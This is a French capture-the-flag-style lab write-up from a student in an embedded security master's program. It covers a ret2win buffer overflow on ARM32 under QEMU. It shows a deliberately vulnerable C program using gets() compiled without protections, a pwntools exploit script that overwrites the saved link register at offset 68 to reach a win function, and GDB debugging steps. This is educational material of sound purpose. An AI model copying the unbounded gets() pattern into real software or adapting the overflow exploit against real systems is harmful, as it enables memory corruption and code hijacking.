# Write-up — Lab 18 : ARM Buffer Overflow sur QEMU

> **Pilier 3 — Embarqué / C-ASM x86-64 · ARM / QEMU**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![ARM32](https://img.shields.io/badge/arch-ARM32-red.svg)]()
[![QEMU](https://img.shields.io/badge/emulation-QEMU%20user-orange.svg)]()
[![ret2win](https://img.shields.io/badge/technique-ret2win-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** Premier overflow sur architecture ARM32 — émulé via QEMU user-mode  
**Technique :** `gets()` overflow → écraser le LR (Link Register) → rediriger vers `win()`  
**Différence vs x86-64 :** Adresses 32 bits (`p32`), LR = registre de retour (r14), offset 68 bytes

---

## 2. ARM32 vs x86-64 — différences clés

| Élément | x86-64 | ARM32 |
| --- | --- | --- |
| Registre de retour | RIP (sur stack) | LR / r14 (sauvegardé sur stack) |
| Taille pointeur | 8 bytes (`p64`) | 4 bytes (`p32`) |
| Registres args | RDI, RSI, RDX | r0, r1, r2 |
| Modes d'instruction | 1 mode | ARM (32-bit) + Thumb (16-bit) |
| Endianness | Little-endian | Little-endian (généralement) |

---

## 3. Setup — outils requis

```bash
# Cross-compilateur ARM + QEMU user-mode + GDB multiarch
sudo apt-get install -y \
    gcc-arm-linux-gnueabihf \
    qemu-user \
    gdb-multiarch \
    libc6-armhf-cross

# Vérification
arm-linux-gnueabihf-gcc --version
qemu-arm --version
```

---

## 4. Code vulnérable — `target.c`

```c
void win() {
    printf(">>> FLAG : AngeVirus{arm_overflow_controlled_pc} <<<\n");
}

void vulnerable() {
    char buffer[64];
    printf("win @ %p\n", win);   // leak adresse win()
    fflush(stdout);
    gets(buffer);                 // overflow — pas de borne
}
```

---

## 5. Compilation ARM32

```bash
arm-linux-gnueabihf-gcc -g -fno-stack-protector -no-pie -o target target.c

# Vérifier l'architecture
file target
# target: ELF 32-bit LSB executable, ARM, EABI5

# checksec
checksec --file=target
# Arch: arm-32-little, No canary, NX enabled, No PIE
```

---

## 6. Stack layout ARM32

```
vulnerable() frame :
┌─────────────────────┐ ← SP initial
│   buffer[64]        │
│   saved FP (r11)    │ ← +64 (4 bytes)
│   saved LR (r14)    │ ← +68 (4 bytes) ← CIBLE
└─────────────────────┘
```

Offset = 64 (buffer) + 4 (saved FP) = **68 bytes**

---

## 7. Exploit — `exploit.py`

```python
from pwn import *

elf = ELF('./target')
context.arch = 'arm'

p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabihf', './target'])

line = p.recvline()
win_addr = int(line.split(b'@ ')[1].strip(), 16)
log.info(f"win @ 0x{win_addr:x}")

OFFSET = 68
payload = b'A' * OFFSET + p32(win_addr)   # p32 pour ARM32 !
p.sendline(payload)
log.success(p.recvall(timeout=2).decode())
```

---

## 8. Debug avec GDB multiarch

```bash
# Terminal 1 — QEMU avec gdbserver
qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf ./target

# Terminal 2 — GDB multiarch
gdb-multiarch ./target
(gdb) set architecture arm
(gdb) target remote :1234
(gdb) b vulnerable
(gdb) c
(gdb) info registers    # voir r0-r15, pc, lr, sp
(gdb) x/20wx $sp        # inspecter la stack ARM
```

---

## 9. Progression ARM

| Lab | Technique | Nouveauté |
| --- | --- | --- |
| **Lab18** | **ret2win ARM32** | **QEMU, LR, p32** |
| Lab19 | ROP chain ARM | Gadgets Thumb/ARM |
| Lab20 | ret2libc ARM | libc ARM sur QEMU |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Architecture | ARM32 little-endian |
| Émulation | QEMU user-mode (`qemu-arm`) |
| Overflow | `gets()` — pas de borne |
| Registre cible | LR (r14) sauvegardé sur stack |
| Offset | 68 bytes |
| Payload | `p32(win_addr)` |

> Screenshot : [docs/lab18_arm_overflow.png](docs/lab18_arm_overflow.png)

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
